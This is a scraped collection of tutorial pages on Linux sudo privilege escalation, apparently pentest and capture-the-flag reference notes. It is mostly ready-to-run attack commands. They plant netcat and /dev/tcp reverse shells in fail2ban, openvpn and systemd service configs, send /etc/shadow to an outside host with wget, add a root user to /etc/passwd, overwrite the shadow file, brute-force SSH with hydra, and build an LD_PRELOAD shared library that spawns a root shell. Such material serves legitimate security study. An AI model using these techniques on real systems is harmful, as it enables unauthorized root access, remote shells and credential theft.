[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/#exploitation)

First execute **"screen"** command as root, then a screen session will be start. Now we can spawn a root shell by pressing **“Ctrl+a+c”** in the screen session.

# Sudo Vim Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-vim-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (ALL) NOPASSWD: vim example.txt
    Copied!

If we can execute **"vim"** command as root, we can execute the shell command in the vim editor.

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-vim-privilege-escalation#exploitation)

Simply run **"vim"** command as root.

Copy

    sudo vim example.txt
    Copied!

In Vim editor, we can run shell commands as root.

Copy

    :r!whoami

# Sudo Fail2ban Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

**Fail2ban** is an intrusion prevention software framework. It prevents against brute force attacks.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (root) NOPASSWD: /etc/init.d/fail2ban restart
    Copied!

If we can execute **"fail2ban"** as root, we can gain access to privileges by modifying the configuration file. We need to check if the config file is writable.

Copy

    find /etc -writable -ls 2>/dev/null
    
    4 drwxrwx--- 2 root security  4096 Oct 16 08:57 /etc/fail2ban/action.d
    Copied!

Look inside of **"/etc/fail2ban/jail.conf"** to know more about how fail2ban is configured.

Copy

    less /etc/fail2ban/jail.conf
    
    # ---------------------------------------------
    
    # output
    
    ...
    # "bantime" is the number of seconds that a host is banned.
    bantime  = 10s
    
    # A host is banned if it has generated "maxretry" during the last "findtime"
    # seconds.
    findtime  = 10s
    
    # "maxretry" is the number of failures before a host get banned.
    maxretry = 5
    ...
    Copied!

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation#id-1.-modify-the-configuration-file)

[1\. Modify the Configuration Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/#1.-modify-the-configuration-file)

For privilege escalation, we need to update the **"iptables-multiport.conf"**. Specifically, insert a payload to one of the following values.

*   **actionstart**
    
*   **actionstop**
    
*   **actioncheck**
    
*   **actionban**
    
*   **actionunban**
    

Here update the value of **actionban** which triggers ban on multiple login attempts. Copy **iptables-multiport.conf** to the current user's home directory.

Now modify the file.

We insert a reverse shell payload into the **actionban**.

Then move back the config file to the original one.

To apply the new configuration, restart it as root.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation#id-2.-trigger-the-action)

[2\. Trigger the Actionarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/#2.-trigger-the-action)

Start a listener in local machine.

Try to login with the wrong passwords multiple times until we will get banned. So that to, **hydra** is useful.

After a short time, you will get a root shell via listener.

[PreviousSudo Exiftool Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation)
[NextSudo Git Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation#exploitation)
    

Copy

    ls -al /etc/fail2ban/action.d/iptables-multiport.conf
    # copy this file into the home directory for editing the content
    cp /etc/fail2ban/action.d/iptables-multiport.conf ~
    Copied!

Copy

    vim ~/iptables-multiport.conf
    Copied!

Copy

    actionban = /usr/bin/nc 10.0.0.1 4444 -e /bin/bash
    Copied!

Copy

    mv ~/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
    Copied!

Copy

    sudo /etc/init.d/fail2ban restart
    Copied!

Copy

    nc -lvnp 4444
    Copied!

Copy

    hydra -l root -P passwords.txt <target-ip> ssh
    Copied!

# Sudo Shutdown, Poweroff Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (ALL) NOPASS: /usr/sbin/shutdown
    Copied!

If we can execute **"shutdown"** command as root, we can gain access to privileges by overwriting the path of **"poweroff"**.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/#exploitation)

First create **/tmp/poweroff** binary which invoke a shell.

Copy

    echo /bin/sh > /tmp/poweroff
    # or
    echo /bin/bash > /tmp/poweroff
    Copied!

Then change permissions of the file and add **"/tmp"** folder to **PATH**.

Copy

    chmod +x /tmp/poweroff
    export PATH=/tmp:$PATH
    Copied!

Now execute **"shutdown"** as root.

**/tmp/poweroff** is executed and spawn a root shell.

[PreviousSudo Service Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation)
[NextSudo Systemctl Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation#exploitation)
    

Copy

    # Some SUID command
    sudo /usr/sbin/shutdown
    
    # Then you are root user
    root>
    Copied!

# Sudo OpenVPN Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/#investigation)

Copy

    (root) /usr/sbin/openvpn /opt/example.ovpn
    Copied!

If we can execute `**openvpn**` command as root and we have a **permission of editing** the `**.ovpn**` file, we can escalate to privilege.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation#id-1.-create-a-payload)

[1\. Create a Payloadarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/#1.-create-a-payload)

First create a shell script to reverse shell. For example, create `**/tmp/shell.sh**`. Replace `**<local-ip>**` with your local ip address.

Copy

    #!/bin/bash
    
    bash -i >& /dev/tcp/<local-ip>/4444 0>&1
    Copied!

Then change the file permission so that root can execute this script.

Copy

    chmod +x /tmp/shell.sh
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation#id-2.-edit-.ovpn-file)

[2\. Edit .ovpn Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/#2.-edit-.ovpn-file)

Next edit the `**.ovpn**` file. We need to add **"script-security 2"** and **"**`**up /tmp/shell.sh**`**"** into the header.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation#id-3.-reverse-shell)

[3\. Reverse Shellarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/#3.-reverse-shell)

In local machine, start a listener.

Now execute `openvpn` command as root.

This command executes our `**shell.sh**`, so we should get a root shell.

[PreviousSudo Java Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation)
[NextSudo Path Traversal Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-path-traversal-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation#exploitation)
    

Copy

    # /opt/example.ovpn
    ...
    script-security 2
    up /tmp/shell.sh
    
    <ca>
    -----BEGIN CERTIFICATE-----
    ...
    Copied!

Copy

    nc -lvnp 4444
    Copied!

Copy

    sudo /usr/sbin/openvpn /opt/example.ovpn
    Copied!

# Sudo Umount Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-umount-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (root) NOPASSWD: /bin/umount
    Copied!

If we can execute umount command as root, we can escalate to privilege.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-umount-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/#exploitation)

In target machine, check what directory is mounted.

Copy

    cat /etc/fstab
    showmount -e localhost
    Copied!

Assume the `**/opt/example**` folder is mounted. If we unmount this folder, original files, that existed before the directory is mounted, may appear.

Copy

    sudo /bin/umount /opt/example
    ls -al /opt/example

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-umount-privilege-escalation#investigation)

# Sudo Tee Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/#investigation)

Copy

    (root) NOPASSWD: /usr/bin/tee
    Copied!

If we can execute `**tee**` command as root, we can escalate to privilege.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation#id-1.-create-a-new-password-for-new-user)

[1\. Create a New Password for New Userarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/#1.-create-a-new-password-for-new-user)

Assume the new username is "tester".

Copy

    # -1: MD5 algorithm
    # -salt: Use privided salt -> The new username here
    openssl passwd -1 -salt "tester" "password123"
    
    # Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/
    Copied!

Copy the output password.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation#id-2.-write-new-line-with-tee)

[2\. Write New Line with Teearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/#2.-write-new-line-with-tee)

Paste the password in `**printf**` and overwrite `**/etc/passwd**` using `**tee**` command.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation#id-3.-switch-to-new-user)

[3\. Switch to New Userarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/#3.-switch-to-new-user)

Now the new user was created. We can switch to the new user.

[PreviousSudo Systemctl Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation)
[NextSudo Umount Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-umount-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation#exploitation)
    

Copy

    printf 'tester:$1$tester$LvsygQ2GEt7VUJQEqhMLf/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
    Copied!

Copy

    su tester
    password: password123

# Sudo Privilege Escalation by Overriding Shared Library | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-privilege-escalation-by-overriding-shared-library#ld_preload-2c-ld_library_path-overwriting)

[LD\_PRELOAD, LD\_LIBRARY\_PATH Overwritingarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/#ld_preload%2C-ld_library_path-overwriting)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-privilege-escalation-by-overriding-shared-library#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/#investigation)

Check sudo commands.

Copy

    sudo -l
    Copied!

The below is the output example.

Copy

    env_keep+=LD_PRELOAD
    
    (ALL : ALL) NOPASSWD: somecmd
    Copied!

If we find the sudo command keeps **LD\_PRELOAD** environment, we can overwrite this variable to load our custome shared object and escalate the privileges.

Also, we can replace the **LD\_PRELOAD** with **LD\_LIBRARY\_PATH**.

By the way, to list shared libraries required by the executable, use `ldd` command.

Copy

    ldd somecmd
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-privilege-escalation-by-overriding-shared-library#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/#exploitation)

First off, create **exploit.c** under **/tmp** .

*   The **"constructor"** attribute is a special type of function attribute in GCC. It tells the compiler to automatically call the function before the main function.
    

Now compile the c program to shared object.

We can execute command with setting the shared library to **LD\_PRELOAD** variable then spawn the root shell.

[PreviousSudo Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-privilege-escalation)
[NextSudo Reboot Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation)

Last updated 2 years ago

Copy

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    void inject()__attribute__((constructor));
    
    void inject() {
    	unsetenv("LD_PRELOAD");
    	setuid(0);
    	setgid(0);
    	system("/bin/bash");
    }
    Copied!

Copy

    # -fPIC: Generate Position Independent Code.
    # -shared: Generate a shared library.
    # -o: Output shared object.
    gcc  -fPIC -shared -o exploit.so exploit.c
    Copied!

Copy

    sudo LD_PRELOAD=/tmp/exploit.so somecmd

---

# Sudo Service Privilege Escalation | Linux Privilege Escalation

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (ALL : ALL) /usr/sbin/service vsftpd restart
    Copied!

If we can execute **service** command as root, we may be able to escalate to root privilege.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation#id-1.-find-the-location-of-the-config-file)

[1\. Find the Location of the Config Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/#1.-find-the-location-of-the-config-file)

Assume we can operate the **vsftpd** service as root. Firse off, find the service config file for vsftpd.

Copy

    find / -name "*vsftpd*"
    Copied!

For instance, we'll find the location as below.

Copy

    /lib/systemd/system/vsftpd.service
    /etc/systemd/system/multi-user.target.wants/vsftpd.service
    Copied!

When getting the locations, the next thing to do is to check the permission. If we have a write permission for the above each files, we can update the execution when vsftpd started.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation#id-2.-update-the-config-file)

[2\. Update the Config Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/#2.-update-the-config-file)

Insert the payload for reverse shell to the value of the **“ExecStartPre”**. Doing this, we can get a shell from our listener when the FTP daemon restarted.

Then we need to reload the daemon.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation#id-3.-execution)

[3\. Executionarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/#3.-execution)

In local machine, start listener for getting a shell.

Now execute the command which can be executed with sudo.

We should get a shell as root user.

[PreviousSudo Screen Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-screen-privilege-escalation)
[NextSudo Shutdown, Poweroff Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation#exploitation)
    

Copy

    [Unit]
    Description=vsftpd FTP server
    After=network.target
    
    [Service]
    Type=simple
    ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
    ExecReload=/bin/kill -HUP $MAINPID
    ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'
    
    [Install]
    WantedBy=multi-user.target
    Copied!

Copy

    systemctl daemon-reload
    Copied!

Copy

    nc -lvnp 4444
    Copied!

Copy

    sudo /usr/sbin/service vsftpd restart
    Copied!

---

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/irb-interactive-ruby-shell-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/irb-privilege-escalation/#exploitation)

    irb
    
    # #q!: Define a string literal
    > exec %q!whoami!

# Sudo Wget Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (root) NOPASSWD: /usr/bin/wget
    Copied!

If we can execute **"wget"** as root, we may be able to escalate privileges.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#modify-2fetc-2fshadow)

[Modify /etc/shadowarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/#modify-%2Fetc%2Fshadow)

Get **"/etc/shadow"** and generate a new hash passwd, then set it to the shadow file, next upload it. That changes the root password.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#id-1.-get-the-content-of-2fetc-2fshadow)

[1\. Get the Content of /etc/shadowarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/#1.-get-the-content-of-%2Fetc%2Fshadow)

To see the content of /etc/shadow, we can use netcat listener. So First, start a listener in local machine.

Copy

    nc -lvnp 4444
    Copied!

In target machine, display the contents of the **"/etc/shadow"** to the local machine using the following command.

Copy

    sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444
    Copied!

We should see the content in our local machine via netcat listener. Copy the content.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#id-2.-create-a-new-shadow-file)

[2\. Create a New Shadow Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/#2.-create-a-new-shadow-file)

We create a new shadow file in local. The shadow file will be stored into the target **/etc/shadow** later.

In vim editor (or nano, vi, etc.), paste the content of /etc/shadow which we've copied in the previous section.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#id-3.-create-a-new-root-user-password-and-add-to-shadow-file)

[3\. Create a New Root User Password and Add to Shadow Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/#3.-create-a-new-root-user-password-and-add-to-shadow-file)

Generate a new hash password for a new root user in local machine.

Copy the generated password and paste it at the password of the root user into the **"shadow.txt"**. As a result, the contents of the **"shadow.txt"** should look like this:

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#id-4.-transfer-the-content-of-the-shadow-file)

[4\. Transfer the Content of the Shadow Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/#4.-transfer-the-content-of-the-shadow-file)

To put the **shadow.txt** into the target machine, start web server for hosting this file.

Download this file into the **/etc/shadow** in remote machine. To do that, we need to run it as root.

Finally, you can switch to the root user with the password we've created.

[PreviousSudo Wall Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wall-privilege-escalation)
[NextSudoedit Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudoedit-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#investigation)
    
*   [Modify /etc/shadow](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation#modify-2fetc-2fshadow)
    

Copy

    vim shadow.txt
    Copied!

Copy

    # -6: SHA512
    openssl passwd -6 -salt 'salt' 'password'
    Copied!

Copy

    root:$6$salt$IxDD...DCy.g.:18195:0:99999:7:::
    ...
    Copied!

Copy

    python3 -m http.server 8000
    Copied!

Copy

    sudo /usr/bin/wget http://<local-ip>:8000/shadow.txt -O /etc/shadow 
    Copied!

Copy

    su root

# Sudoedit Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudoedit-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (root) sudoedit /opt/example.txt
    Copied!

If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudoedit-privilege-escalation#exploitation-cve-2023-22809)

[Exploitation (arrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/#exploitation-(cve-2023-22809))
[CVE-2023-22809arrow-up-right](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)
)

Copy

    export EDITOR="vim -- /etc/sudoers"
    sudoedit /opt/example.txt
    Copied!

In vim editor, add the following line in `**/etc/sudoers**`. Assume the current username is “john”

Copy

    john ALL=(ALL:ALL) ALL
    Copied!

After that, we can escalate to root privilege.

Copy

    sudo su root
    Copied!

# Sudo Wall Privilege Escalation | Linux Privilege Escalation

